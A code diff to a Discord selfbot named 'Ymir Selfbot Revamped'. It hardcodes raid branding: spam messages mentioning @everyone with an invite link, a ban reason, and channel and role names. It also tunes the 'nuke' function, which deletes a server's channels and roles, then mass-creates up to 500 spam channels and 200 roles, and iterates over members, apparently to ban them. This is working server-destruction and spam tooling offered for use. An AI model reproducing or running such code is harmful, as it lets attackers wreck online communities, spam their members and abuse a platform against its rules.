@@ -30,13 +30,13 @@ prefix = config.get('prefix')
 ymir = commands.Bot(command_prefix=prefix, description="Ymir Selfbot Revamped", case_insensitive=False, self_bot=True,intents=intents)
 ymir.remove_command('help')
 
-servername = config.get('server-name')
-webhookname = config.get('webhook-name')
-webhookspam = config.get('webhook-spam')
-banreason = config.get('ban-reason')
-webhookavatar = config.get('webhook-avatar')
-rolename = config.get('role-name')
-channelname = config.get('channel-name')
+servername = 'Ran By Ymir'
+webhookname = ["You Are A Subject Of Ymir", "Ymir Was Here"]
+webhookspam = ["@everyone discord.gg/ymir","@everyone Nuked By Ymir"]
+banreason = 'Ymir Said So'
+webhookavatar = 'https://cdn.discordapp.com/attachments/806362867392839771/806373051771256852/image0.jpg'
+rolename = 'Subjects of Ymir'
+channelname = ["Ymir SB","Ymir Ran You"]
 
 @ymir.event
 async def on_ready():
@@ -176,7 +176,7 @@ async def nuke(guild):
           print(f"Successfully deleted channel {channel.name}")
         except:
           print(f"Channel {channel.name} has NOT been deleted.")
-      for i in range(50):
+      for i in range(500):
         await guild.create_text_channel(random.choice(channelname))
       for role in list(guild.roles):
         try:
@@ -184,7 +184,7 @@ async def nuke(guild):
           print (f"{role.name} has been deleted in {guild.name}")
         except:
           print (f"{role.name} has NOT been deleted in {guild.name}")
-      for i in range(250):
+      for i in range(200):
         await guild.create_role(name=rolename)
       for user in list(guild.members):
           try:
